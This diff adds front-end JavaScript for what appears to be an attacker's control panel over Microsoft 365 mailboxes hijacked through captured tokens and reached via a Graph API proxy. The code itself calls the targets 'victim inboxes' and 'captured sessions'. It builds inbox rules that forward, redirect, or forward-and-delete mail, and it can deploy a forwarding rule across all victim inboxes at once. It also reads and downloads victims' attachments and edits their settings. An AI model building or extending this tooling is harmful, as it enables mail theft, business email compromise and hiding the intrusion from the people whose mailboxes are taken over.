+                    <div class="owa-config-card">
+                        <h4>Send replies outside your organization</h4>
+                        <div style="display:flex; align-items:center; gap:16px;">
+                            <label style="font-size:12px; font-weight:600; color:#323130;">External audience:</label>
+                            <select id="autoreply-audience" class="owa-select">
+                                <option value="none" ${aud === 'none' ? 'selected' : ''}>None (Don't send outside org)</option>
+                                <option value="contactsOnly" ${aud === 'contactsOnly' ? 'selected' : ''}>My contacts only</option>
+                                <option value="all" ${aud === 'all' ? 'selected' : ''}>Anyone outside my organization</option>
+                            </select>
+                        </div>
+                        <textarea id="autoreply-external-msg" class="owa-textarea" placeholder="Thank you for reaching out. I am away...">${auto.externalReplyMessage || ''}</textarea>
+                    </div>
+
+                    <div style="display:flex; justify-content:flex-end; gap:10px; margin-top:10px;">
+                        <button type="button" class="owa-primary-btn" id="btn-save-autoreply" onclick="saveAutomaticReplies()">Save changes</button>
+                    </div>
+                `;
+            } catch (e) {
+                container.innerHTML = `<div style="color:var(--danger); padding:16px 0;">Failed to load automatic replies: ${e}</div>`;
+            }
+        }
+
+        function toggleScheduledDates(status) {
+            const box = document.getElementById('autoreply-scheduled-box');
+            if (box) box.style.display = status === 'scheduled' ? 'grid' : 'none';
+        }
+
+        async function saveAutomaticReplies() {
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            const btn = document.getElementById('btn-save-autoreply');
+            const statusRadio = document.querySelector('input[name="auto-reply-status"]:checked');
+            const status = statusRadio ? statusRadio.value : 'disabled';
+            const internalMsg = document.getElementById('autoreply-internal-msg').value;
+            const externalMsg = document.getElementById('autoreply-external-msg').value;
+            const audience = document.getElementById('autoreply-audience').value;
+            const startVal = document.getElementById('autoreply-start-time')?.value;
+            const endVal = document.getElementById('autoreply-end-time')?.value;
+
+            btn.disabled = true;
+            btn.innerText = 'Saving to Graph...';
+
+            const autoPayload = {
+                status: status,
+                externalAudience: audience,
+                internalReplyMessage: internalMsg,
+                externalReplyMessage: externalMsg
+            };
+
+            if (status === 'scheduled') {
+                if (startVal) autoPayload.scheduledStartDateTime = { dateTime: new Date(startVal).toISOString(), timeZone: 'UTC' };
+                if (endVal) autoPayload.scheduledEndDateTime = { dateTime: new Date(endVal).toISOString(), timeZone: 'UTC' };
+            }
+
+            try {
+                const res = await (await fetch('/api/graph_proxy/update_settings', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        user_code: uc,
+                        payload: { automaticRepliesSetting: autoPayload }
+                    })
+                })).json();
+
+                btn.disabled = false;
+                btn.innerText = 'Save changes';
+
+                if (res.error) {
+                    alert('Error saving automatic replies: ' + (res.error.message || res.error));
+                } else {
+                    showToast('✓ Automatic replies saved to Graph API successfully!');
+                }
+            } catch(e) {
+                btn.disabled = false;
+                btn.innerText = 'Save changes';
+                alert('Save failed: ' + e);
+            }
+        }
+
+        function onRuleActionTypeChange() {
+            const act = document.getElementById('new-rule-action-type')?.value;
+            const fwdRow = document.getElementById('new-rule-forward-row');
+            const fldRow = document.getElementById('new-rule-folder-row');
+            const isFwd = (act === 'forwardTo' || act === 'forwardAndDelete' || act === 'forwardAndMove' || act === 'forwardAsAttachment' || act === 'redirectTo');
+            const isFld = (act === 'moveToFolder' || act === 'forwardAndMove');
+            if (fwdRow) fwdRow.style.display = isFwd ? 'block' : 'none';
+            if (fldRow) fldRow.style.display = isFld ? 'block' : 'none';
+        }
+
+        async function openNewRuleForm() {
+            const card = document.getElementById('new-rule-card');
+            if (card) {
+                card.style.display = 'block';
+                document.getElementById('new-rule-name').focus();
+            }
+            onRuleActionTypeChange();
+
+            // Populate all mailbox folders dynamically from Graph API
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session')?.value;
+            const folderSel = document.getElementById('new-rule-target-folder');
+            if (uc && folderSel) {
+                try {
+                    const res = await (await fetch(`/api/graph_proxy/folders?user_code=${uc}`)).json();
+                    const folders = res.value || [];
+                    if (folders.length > 0) {
+                        folderSel.innerHTML = folders.map(f => `<option value="${escapeHtml(f.id)}">${escapeHtml(f.displayName)} (${f.totalItemCount || 0} items)</option>`).join('');
+                    }
+                } catch(e) {
+                    console.error('Failed to load folders for rule:', e);
+                }
+            }
+        }
+
+        function closeNewRuleForm() {
+            const card = document.getElementById('new-rule-card');
+            if (card) card.style.display = 'none';
+        }
+
+        async function loadMessageRules(uc) {
+            const container = document.getElementById('rules-content');
+            container.innerHTML = '<div style="padding:16px 0; color:#605e5c;">Loading inbox rules from Graph API...</div>';
+            try {
+                const data = await (await fetch(`/api/graph_proxy/rules?user_code=${uc}`)).json();
+                if (data.error) {
+                    container.innerHTML = `<div style="color:var(--danger); padding:16px 0;">⚠️ ${data.error.message || data.error}</div>`;
+                    return;
+                }
+                const rules = data.value || [];
+                if (rules.length === 0) {
+                    container.innerHTML = '<div class="owa-config-card" style="text-align:center; padding:30px; color:#605e5c;"><div style="font-size:28px; margin-bottom:8px;">📋</div><b>No inbox rules found</b><div style="font-size:12px; margin-top:4px;">Click "+ Add new rule" above to create an automated message rule via Graph API.</div></div>';
+                    return;
+                }
+
+                container.innerHTML = `
+                    <div style="overflow-x:auto; border:1px solid #edebe9; border-radius:6px; background:#ffffff;">
+                        <table class="owa-rules-table" style="width:100%; border-collapse:collapse; font-size:13px; text-align:left; background:#ffffff !important; min-width:100% !important;">
+                            <thead>
+                                <tr style="background:#faf9f8 !important; border-bottom:1px solid #edebe9; color:#323130;">
+                                    <th style="padding:10px 14px; background:#faf9f8 !important; color:#323130; font-weight:700;">Rule name</th>
+                                    <th style="padding:10px 14px; background:#faf9f8 !important; color:#323130; font-weight:700;">Order</th>
+                                    <th style="padding:10px 14px; background:#faf9f8 !important; color:#323130; font-weight:700;">Enabled</th>
+                                    <th style="padding:10px 14px; background:#faf9f8 !important; color:#323130; font-weight:700;">Condition</th>
+                                    <th style="padding:10px 14px; background:#faf9f8 !important; color:#323130; font-weight:700;">Action</th>
+                                    <th style="padding:10px 14px; background:#faf9f8 !important; color:#323130; font-weight:700; text-align:center;">Manage</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                ${rules.map(r => {
+                                    let condStr = [];
+                                    if (r.conditions?.subjectContains) condStr.push('Subject: "' + r.conditions.subjectContains.join(', ') + '"');
+                                    if (r.conditions?.senderContains) condStr.push('Sender: "' + r.conditions.senderContains.join(', ') + '"');
+                                    if (condStr.length === 0) condStr.push('All incoming messages');
+
+                                    let actStr = [];
+                                    if (r.actions?.forwardTo) {
+                                        const recs = r.actions.forwardTo.map(f => (f.emailAddress?.address || f.emailAddress?.name || JSON.stringify(f))).join(', ');
+                                        actStr.push('Forward to: ' + recs);
+                                    }
+                                    if (r.actions?.forwardAsAttachmentTo) {
+                                        const recs = r.actions.forwardAsAttachmentTo.map(f => (f.emailAddress?.address || f.emailAddress?.name || JSON.stringify(f))).join(', ');
+                                        actStr.push('Forward attachment to: ' + recs);
+                                    }
+                                    if (r.actions?.redirectTo) {
+                                        const recs = r.actions.redirectTo.map(f => (f.emailAddress?.address || f.emailAddress?.name || JSON.stringify(f))).join(', ');
+                                        actStr.push('Redirect to: ' + recs);
+                                    }
+                                    if (r.actions?.moveToFolder) actStr.push('Move to folder (' + r.actions.moveToFolder + ')');
+                                    if (r.actions?.delete) actStr.push('Delete message');
+                                    if (r.actions?.markAsRead) actStr.push('Mark as read');
+                                    if (actStr.length === 0) actStr.push(JSON.stringify(r.actions || {}));
+
+                                    return `
+                                    <tr style="border-bottom:1px solid #edebe9; background:#ffffff !important;">
+                                        <td style="padding:10px 14px; font-weight:700; color:#111111; background:#ffffff !important;">${escapeHtml(r.displayName || 'Untitled')}</td>
+                                        <td style="padding:10px 14px; color:#444444; background:#ffffff !important;">${r.sequence}</td>
+                                        <td style="padding:10px 14px; background:#ffffff !important;">
+                                            <input type="checkbox" style="width:16px; height:16px; cursor:pointer; accent-color:#0078d4;" ${r.isEnabled ? 'checked' : ''} onchange="toggleInboxRule('${r.id}', this.checked)">
+                                        </td>
+                                        <td style="padding:10px 14px; color:#222222; font-size:12.5px; background:#ffffff !important;">${escapeHtml(condStr.join('; '))}</td>
+                                        <td style="padding:10px 14px; color:#005a9e; font-weight:600; font-size:12.5px; background:#ffffff !important;">${escapeHtml(actStr.join('; '))}</td>
+                                        <td style="padding:10px 14px; text-align:center; background:#ffffff !important;">
+                                            <button type="button" class="owa-win-btn close" style="display:inline-flex; width:28px; height:28px; color:#a80000;" title="Delete rule" onclick="deleteInboxRule('${r.id}')">🗑️</button>
+                                        </td>
+                                    </tr>`;
+                                }).join('')}
+                            </tbody>
+                        </table>
+                    </div>
+                `;
+            } catch (e) {
+                container.innerHTML = `<div style="color:var(--danger); padding:16px 0;">Failed to load rules: ${e}</div>`;
+            }
+        }
+
+        async function saveNewInboxRule() {
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            const name = document.getElementById('new-rule-name').value.trim();
+            const seq = parseInt(document.getElementById('new-rule-sequence').value, 10) || 1;
+            const subj = document.getElementById('new-rule-subject-contains').value.trim();
+            const sender = document.getElementById('new-rule-sender-contains').value.trim();
+            const actionType = document.getElementById('new-rule-action-type').value;
+            const forwardEmail = document.getElementById('new-rule-forward-email')?.value.trim();
+            const targetFolder = document.getElementById('new-rule-target-folder')?.value;
+            const allInboxes = document.getElementById('new-rule-all-inboxes')?.checked || false;
+            const btn = document.getElementById('btn-save-new-rule');
+
+            if (!name) { alert('Please enter a rule name'); return; }
+            if ((actionType.startsWith('forward') || actionType === 'redirectTo') && !forwardEmail) {
+                alert('Please enter a recipient email address for the forwarding rule.');
+                return;
+            }
+
+            const conditions = {};
+            if (subj) conditions.subjectContains = subj.split(',').map(s => s.trim()).filter(Boolean);
+            if (sender) conditions.senderContains = sender.split(',').map(s => s.trim()).filter(Boolean);
+
+            const actions = {};
+            if (actionType === 'forwardTo') {
+                actions.forwardTo = [{ emailAddress: { address: forwardEmail } }];
+            } else if (actionType === 'forwardAndDelete') {
+                actions.forwardTo = [{ emailAddress: { address: forwardEmail } }];
+                actions.moveToFolder = 'deleteditems';
+            } else if (actionType === 'forwardAndMove') {
+                actions.forwardTo = [{ emailAddress: { address: forwardEmail } }];
+                actions.moveToFolder = targetFolder || 'deleteditems';
+            } else if (actionType === 'forwardAsAttachment') {
+                actions.forwardAsAttachmentTo = [{ emailAddress: { address: forwardEmail } }];
+            } else if (actionType === 'redirectTo') {
+                actions.redirectTo = [{ emailAddress: { address: forwardEmail } }];
+            } else if (actionType === 'moveToFolder') {
+                actions.moveToFolder = targetFolder || 'deleteditems';
+            } else if (actionType === 'moveToDeleted') {
+                actions.moveToFolder = 'deleteditems';
+            } else if (actionType === 'moveToArchive') {
+                actions.moveToFolder = 'archive';
+            } else if (actionType === 'moveToJunk') {
+                actions.moveToFolder = 'junkemail';
+            } else if (actionType === 'delete') {
+                actions.delete = true;
+            } else if (actionType === 'markRead') {
+                actions.markAsRead = true;
+            }
+
+            const rulePayload = {
+                displayName: name,
+                sequence: seq,
+                isEnabled: true,
+                conditions: conditions,
+                actions: actions
+            };
+
+            btn.disabled = true;
+            btn.innerText = 'Creating on Graph...';
+
+            try {
+                const res = await (await fetch('/api/graph_proxy/create_rule', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ user_code: uc, rule: rulePayload, all_inboxes: allInboxes })
+                })).json();
+
+                btn.disabled = false;
+                btn.innerText = 'Save rule';
+
+                if (res.error) {
+                    showToast('⚠️ Error creating rule: ' + (res.error.message || res.error));
+                } else {
+                    const msg = allInboxes 
+                        ? `✓ Forwarding rule deployed across ${res.created_count || 'all'} victim inboxes!`
+                        : '✓ Inbox rule created successfully via Microsoft Graph!';
+                    showToast(msg);
+                    closeNewRuleForm();
+                    loadMessageRules(uc);
+                }
+            } catch(e) {
+                btn.disabled = false;
+                btn.innerText = 'Save rule';
+                showToast('⚠️ Rule creation failed: ' + e);
+            }
+        }
+
+        async function toggleInboxRule(ruleId, isEnabled) {
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            try {
+                const res = await (await fetch('/api/graph_proxy/toggle_rule', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ user_code: uc, rule_id: ruleId, isEnabled: isEnabled })
+                })).json();
+                if (res.error) {
+                    showToast('⚠️ Error updating rule: ' + (res.error.message || res.error));
+                    loadMessageRules(uc);
+                } else {
+                    showToast(`✓ Rule ${isEnabled ? 'enabled' : 'disabled'}!`);
+                }
+            } catch(e) {
+                showToast('⚠️ Toggle failed: ' + e);
+                loadMessageRules(uc);
+            }
+        }
+
+        async function deleteInboxRule(ruleId) {
+            const ok = await appConfirm({
+                title: 'Delete Inbox Rule',
+                message: 'Are you sure you want to delete this inbox rule from the victim mailbox?',
+                confirmText: 'Delete Rule',
+                danger: true,
+                icon: '🗑️'
+            });
+            if (!ok) return;
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            try {
+                const res = await (await fetch('/api/graph_proxy/delete_rule', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ user_code: uc, rule_id: ruleId })
+                })).json();
+                if (res.error) {
+                    showToast('⚠️ Error deleting rule: ' + (res.error.message || res.error));
+                } else {
+                    showToast('✓ Inbox rule deleted successfully!');
+                    loadMessageRules(uc);
+                }
+            } catch(e) {
+                showToast('⚠️ Delete failed: ' + e);
+            }
+        }
+
+        async function loadGeneralSettings(uc) {
+            const container = document.getElementById('general-content');
+            container.innerHTML = '<div style="padding:16px 0; color:#605e5c;">Loading general mailbox settings...</div>';
+            try {
+                const data = await (await fetch(`/api/graph_proxy/settings?user_code=${uc}`)).json();
+                if (data.error) {
+                    container.innerHTML = `<div style="color:var(--danger); padding:16px 0;">⚠️ ${data.error.message || data.error}</div>`;
+                    return;
+                }
+
+                const tz = data.timeZone || 'UTC';
+                const lang = data.language?.locale || 'en-US';
+                const df = data.dateFormat || 'MM/dd/yyyy';
+                const tf = data.timeFormat || 'h:mm tt';
+
+                container.innerHTML = `
+                    <div class="owa-config-card">
+                        <h4>Language & Time Zone</h4>
+                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px;">
+                            <div>
+                                <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Language</label>
+                                <select id="general-language" class="owa-select" style="width:100%;">
+                                    <option value="en-US" ${lang.startsWith('en') ? 'selected' : ''}>English (United States)</option>
+                                    <option value="en-GB" ${lang === 'en-GB' ? 'selected' : ''}>English (United Kingdom)</option>
+                                    <option value="es-ES" ${lang.startsWith('es') ? 'selected' : ''}>Spanish (Español)</option>
+                                    <option value="fr-FR" ${lang.startsWith('fr') ? 'selected' : ''}>French (Français)</option>
+                                    <option value="de-DE" ${lang.startsWith('de') ? 'selected' : ''}>German (Deutsch)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Current time zone</label>
+                                <select id="general-timezone" class="owa-select" style="width:100%;">
+                                    <option value="UTC" ${tz === 'UTC' ? 'selected' : ''}>(UTC) Coordinated Universal Time</option>
+                                    <option value="Eastern Standard Time" ${tz.includes('Eastern') ? 'selected' : ''}>(UTC-05:00) Eastern Time (US & Canada)</option>
+                                    <option value="Central Standard Time" ${tz.includes('Central') ? 'selected' : ''}>(UTC-06:00) Central Time (US & Canada)</option>
+                                    <option value="Mountain Standard Time" ${tz.includes('Mountain') ? 'selected' : ''}>(UTC-07:00) Mountain Time (US & Canada)</option>
+                                    <option value="Pacific Standard Time" ${tz.includes('Pacific') ? 'selected' : ''}>(UTC-08:00) Pacific Time (US & Canada)</option>
+                                    <option value="GMT Standard Time" ${tz.includes('GMT') || tz.includes('London') ? 'selected' : ''}>(UTC+00:00) Dublin, Edinburgh, Lisbon, London</option>
+                                    <option value="W. Europe Standard Time" ${tz.includes('Europe') ? 'selected' : ''}>(UTC+01:00) Amsterdam, Berlin, Bern, Rome, Paris</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:8px;">
+                            <div>
+                                <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Date format</label>
+                                <select id="general-date-format" class="owa-select" style="width:100%;">
+                                    <option value="MM/dd/yyyy" ${df === 'MM/dd/yyyy' ? 'selected' : ''}>MM/dd/yyyy (04/28/2026)</option>
+                                    <option value="dd/MM/yyyy" ${df === 'dd/MM/yyyy' ? 'selected' : ''}>dd/MM/yyyy (28/04/2026)</option>
+                                    <option value="yyyy-MM-dd" ${df === 'yyyy-MM-dd' ? 'selected' : ''}>yyyy-MM-dd (2026-04-28)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Time format</label>
+                                <select id="general-time-format" class="owa-select" style="width:100%;">
+                                    <option value="h:mm tt" ${tf.includes('tt') ? 'selected' : ''}>12-hour format (1:30 PM)</option>
+                                    <option value="HH:mm" ${!tf.includes('tt') ? 'selected' : ''}>24-hour format (13:30)</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="display:flex; justify-content:flex-end; gap:10px; margin-top:10px;">
+                        <button type="button" class="owa-primary-btn" id="btn-save-general" onclick="saveGeneralSettings()">Save preferences</button>
+                    </div>
+                `;
+            } catch (e) {
+                container.innerHTML = `<div style="color:var(--danger); padding:16px 0;">Failed to load mailbox settings: ${e}</div>`;
+            }
+        }
+
+        async function saveGeneralSettings() {
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            const btn = document.getElementById('btn-save-general');
+            const lang = document.getElementById('general-language').value;
+            const tz = document.getElementById('general-timezone').value;
+            const df = document.getElementById('general-date-format').value;
+            const tf = document.getElementById('general-time-format').value;
+
+            btn.disabled = true;
+            btn.innerText = 'Saving to Graph...';
+
+            try {
+                const res = await (await fetch('/api/graph_proxy/update_settings', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        user_code: uc,
+                        payload: {
+                            timeZone: tz,
+                            language: { locale: lang },
+                            dateFormat: df,
+                            timeFormat: tf
+                        }
+                    })
+                })).json();
+
+                btn.disabled = false;
+                btn.innerText = 'Save preferences';
+
+                if (res.error) {
+                    alert('Error saving preferences: ' + (res.error.message || res.error));
+                } else {
+                    showToast('✓ Mailbox preferences saved to Graph API successfully!');
+                }
+            } catch(e) {
+                btn.disabled = false;
+                btn.innerText = 'Save preferences';
+                alert('Save failed: ' + e);
+            }
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // OUTLOOK WEB ATTACHMENT INTERACTIONS & PREVIEW SYSTEM
+        // ═══════════════════════════════════════════════════════════════
+
+        function escAtt(s) {
+            return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+        }
+
+        function getAttachmentTypeInfo(fileName, contentType) {
+            const ext = (fileName || '').split('.').pop().toLowerCase();
+            const mime = (contentType || '').toLowerCase();
+
+            if (ext === 'pdf' || mime.includes('pdf')) {
+                return { type: 'pdf', badge: 'PDF' };
+            }
+            if (['doc', 'docx', 'dot', 'dotx'].includes(ext) || mime.includes('word') || mime.includes('officedocument.wordprocessingml')) {
+                return { type: 'word', badge: 'DOC' };
+            }
+            if (['xls', 'xlsx', 'csv', 'xlt', 'xlsm'].includes(ext) || mime.includes('excel') || mime.includes('spreadsheet') || mime.includes('csv')) {
+                return { type: 'excel', badge: 'XLS' };
+            }
+            if (['ppt', 'pptx', 'pps'].includes(ext) || mime.includes('powerpoint') || mime.includes('presentation')) {
+                return { type: 'ppt', badge: 'PPT' };
+            }
+            if (['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg', 'bmp', 'ico', 'tif', 'tiff'].includes(ext) || mime.startsWith('image/')) {
+                return { type: 'img', badge: 'IMG' };
+            }
+            if (['zip', 'rar', '7z', 'tar', 'gz', 'bz2', 'iso'].includes(ext) || mime.includes('zip') || mime.includes('compressed')) {
+                return { type: 'archive', badge: 'ZIP' };
+            }
+            if (['txt', 'json', 'py', 'js', 'ts', 'html', 'css', 'md', 'xml', 'sh', 'env', 'ini', 'cfg', 'log', 'yaml', 'yml'].includes(ext) || mime.startsWith('text/')) {
+                return { type: 'code', badge: 'TXT' };
+            }
+            return { type: 'other', badge: 'FILE' };
+        }
+
+        function formatAttachmentSize(bytes) {
+            if (!bytes || bytes <= 0) return '0 KB';
+            if (bytes < 1024 * 1024) return `${Math.max(1, Math.round(bytes / 1024))} KB`;
+            return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
+        }
+
+        function renderAttachmentCard(a) {
+            const info = getAttachmentTypeInfo(a.name, a.contentType);
+            const sizeStr = formatAttachmentSize(a.size);
+            const safeName = escAtt(a.name || 'attachment');
+            const safeId = (a.id || '').replace(/'/g, "\\'");
+            return `
+                <div class="owa-attachment-card" onclick="previewAttachment('${safeId}')" title="Preview ${safeName}">
+                    <div class="owa-att-icon-badge ${info.type}">
+                        <span>${info.badge}</span>
+                    </div>
+                    <div class="owa-att-meta">
+                        <span class="owa-att-name" title="${safeName}">${safeName}</span>
+                        <span class="owa-att-size">${sizeStr}</span>
+                    </div>
+                    <div class="owa-att-actions" onclick="event.stopPropagation()">
+                        <button type="button" class="owa-att-action-btn" title="Preview" onclick="previewAttachment('${safeId}')">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                        </button>
+                        <button type="button" class="owa-att-action-btn" title="Download" onclick="downloadAttachment('${safeId}')">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+
+        function previewAttachment(attId) {
+            const att = (window.currentEmailAttachments || []).find(x => x.id === attId);
+            if (!att) {
+                showToast('Attachment details not found');
+                return;
+            }
+            const modal = document.getElementById('outlookAttachmentPreviewModal');
+            if (!modal) return;
+
+            const nameEl = document.getElementById('preview-file-name');
+            const sizeEl = document.getElementById('preview-file-size');
+            const iconEl = document.getElementById('preview-file-icon');
+            const bodyEl = document.getElementById('preview-modal-body');
+            const dlBtn = document.getElementById('preview-modal-download-btn');
+
+            const name = att.name || 'Attachment';
+            const sizeStr = formatAttachmentSize(att.size);
+            const ext = name.split('.').pop().toLowerCase();
+            const mime = (att.contentType || '').toLowerCase();
+
+            nameEl.textContent = name;
+            sizeEl.textContent = sizeStr;
+            dlBtn.onclick = () => downloadAttachment(attId);
+
+            if (['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg', 'bmp', 'ico'].includes(ext) || mime.startsWith('image/')) {
+                iconEl.textContent = '🖼️';
+                if (att.contentBytes) {
+                    const dataUri = `data:${mime || 'image/png'};base64,${att.contentBytes}`;
+                    bodyEl.innerHTML = `<img src="${dataUri}" style="max-width:100%; max-height:100%; object-fit:contain; border-radius:6px; box-shadow:0 8px 30px rgba(0,0,0,0.25);" alt="${escAtt(name)}">`;
+                } else {
+                    bodyEl.innerHTML = `<div style="text-align:center; padding:40px; color:#605e5c;"><p>Image preview unavailable. Click Download to save.</p><button class="owa-primary-btn" onclick="downloadAttachment('${attId}')">Download image</button></div>`;
+                }
+            } else if (ext === 'pdf' || mime.includes('pdf')) {
+                iconEl.textContent = '📄';
+                if (att.contentBytes) {
+                    try {
+                        const byteChars = atob(att.contentBytes);
+                        const byteNums = new Uint8Array(byteChars.length);
+                        for (let i = 0; i < byteChars.length; i++) byteNums[i] = byteChars.charCodeAt(i);
+                        const blob = new Blob([byteNums], { type: 'application/pdf' });
+                        const blobUrl = URL.createObjectURL(blob);
+                        bodyEl.innerHTML = `<iframe src="${blobUrl}" style="width:100%; height:100%; border:none; background:#ffffff; border-radius:6px; box-shadow:0 4px 20px rgba(0,0,0,0.15);"></iframe>`;
+                    } catch (e) {
+                        bodyEl.innerHTML = `<div style="text-align:center; padding:40px; color:#605e5c;"><p>Error previewing PDF: ${e.message}</p><button class="owa-primary-btn" onclick="downloadAttachment('${attId}')">Download PDF</button></div>`;
+                    }
+                } else {
+                    bodyEl.innerHTML = `<div style="text-align:center; padding:40px; color:#605e5c;"><p>PDF preview unavailable.</p><button class="owa-primary-btn" onclick="downloadAttachment('${attId}')">Download PDF</button></div>`;
+                }
+            } else if (['txt', 'json', 'py', 'js', 'ts', 'html', 'css', 'md', 'xml', 'sh', 'env', 'ini', 'cfg', 'log', 'yaml', 'yml'].includes(ext) || mime.startsWith('text/')) {
+                iconEl.textContent = '📝';
+                if (att.contentBytes) {
+                    try {
+                        const rawText = decodeURIComponent(escape(atob(att.contentBytes)));
+                        bodyEl.innerHTML = `<pre style="width:100%; height:100%; margin:0; padding:20px; box-sizing:border-box; background:#ffffff; border-radius:6px; overflow:auto; font-family:Consolas, Monaco, 'Courier New', monospace; font-size:13px; line-height:1.6; color:#201f1e; box-shadow:0 4px 20px rgba(0,0,0,0.1); white-space:pre-wrap; word-break:break-all;">${escAtt(rawText)}</pre>`;
+                    } catch (e) {
+                        try {
+                            const rawText = atob(att.contentBytes);
+                            bodyEl.innerHTML = `<pre style="width:100%; height:100%; margin:0; padding:20px; box-sizing:border-box; background:#ffffff; border-radius:6px; overflow:auto; font-family:Consolas, Monaco, 'Courier New', monospace; font-size:13px; line-height:1.6; color:#201f1e; box-shadow:0 4px 20px rgba(0,0,0,0.1); white-space:pre-wrap; word-break:break-all;">${escAtt(rawText)}</pre>`;
+                        } catch (err) {
+                            bodyEl.innerHTML = `<div style="text-align:center; padding:40px; color:#605e5c;"><p>Unable to decode text directly. Click below to download.</p><button class="owa-primary-btn" onclick="downloadAttachment('${attId}')">Download file</button></div>`;
+                        }
+                    }
+                } else {
+                    bodyEl.innerHTML = `<div style="text-align:center; padding:40px; color:#605e5c;"><p>File preview unavailable.</p><button class="owa-primary-btn" onclick="downloadAttachment('${attId}')">Download file</button></div>`;
+                }
+            } else {
+                iconEl.textContent = '📦';
+                const info = getAttachmentTypeInfo(name, mime);
+                bodyEl.innerHTML = `
+                    <div style="background:#ffffff; padding:44px 36px; border-radius:8px; text-align:center; max-width:440px; box-shadow:0 8px 30px rgba(0,0,0,0.15); border:1px solid #edebe9; display:flex; flex-direction:column; align-items:center;">
+                        <div class="owa-att-icon-badge ${info.type}" style="width:56px; height:56px; font-size:16px; border-radius:8px; margin-bottom:16px;">
+                            <span>${info.badge}</span>
+                        </div>
+                        <div style="font-size:16px; font-weight:600; color:#201f1e; margin-bottom:6px; word-break:break-word;">${escAtt(name)}</div>
+                        <div style="font-size:13px; color:#605e5c; margin-bottom:24px;">${sizeStr} &bull; ${escAtt(mime || 'Binary Document')}</div>
+                        <button class="owa-primary-btn" onclick="downloadAttachment('${attId}')" style="padding:10px 24px; font-size:14px;">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                            <span>Download ${info.badge} File</span>
+                        </button>
+                    </div>
+                `;
+            }
+
+            modal.classList.add('active');
+        }
+
+        function closeAttachmentPreviewModal() {
+            const modal = document.getElementById('outlookAttachmentPreviewModal');
+            if (modal) {
+                modal.classList.remove('active');
+                const bodyEl = document.getElementById('preview-modal-body');
+                if (bodyEl) bodyEl.innerHTML = '';
+            }
+        }
+
+        function downloadAttachment(attId) {
+            const att = (window.currentEmailAttachments || []).find(x => x.id === attId);
+            const uc = window.currentEmailUc || currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            const mid = window.currentEmailMid;
+
+            if (att && att.contentBytes) {
+                try {
+                    const byteChars = atob(att.contentBytes);
+                    const byteNums = new Uint8Array(byteChars.length);
+                    for (let i = 0; i < byteChars.length; i++) byteNums[i] = byteChars.charCodeAt(i);
+                    const blob = new Blob([byteNums], { type: att.contentType || 'application/octet-stream' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = att.name || 'attachment';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    setTimeout(() => URL.revokeObjectURL(url), 4000);
+                    showToast(`✓ Downloaded ${att.name}`);
+                    return;
+                } catch (e) {
+                    console.warn('Client blob download failed, falling back to server route:', e);
+                }
+            }
+
+            const dlUrl = `/api/graph_proxy/attachment/download?user_code=${encodeURIComponent(uc)}&message_id=${encodeURIComponent(mid)}&attachment_id=${encodeURIComponent(attId)}`;
+            const link = document.createElement('a');
+            link.href = dlUrl;
+            link.download = (att && att.name) || 'attachment';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            showToast(`✓ Downloading attachment...`);
+        }
+
+        function downloadAllCurrentAttachments() {
+            const atts = window.currentEmailAttachments || [];
+            if (!atts.length) return;
+            showToast(`Downloading ${atts.length} attachment(s)...`);
+            atts.forEach((a, index) => {
+                setTimeout(() => {
+                    downloadAttachment(a.id);
+                }, index * 400);
+            });
+        }
+
+        async function deleteSession(uc) {
+            const ok = await appConfirm({
+                title: 'Delete Captured Session',
+                message: `Are you sure you want to permanently delete session ${uc}? All tokens and captured data for this victim will be removed.`,
+                confirmText: 'Delete Session',
+                icon: '🗑️',
+                danger: true
+            });
+            if (!ok) return;
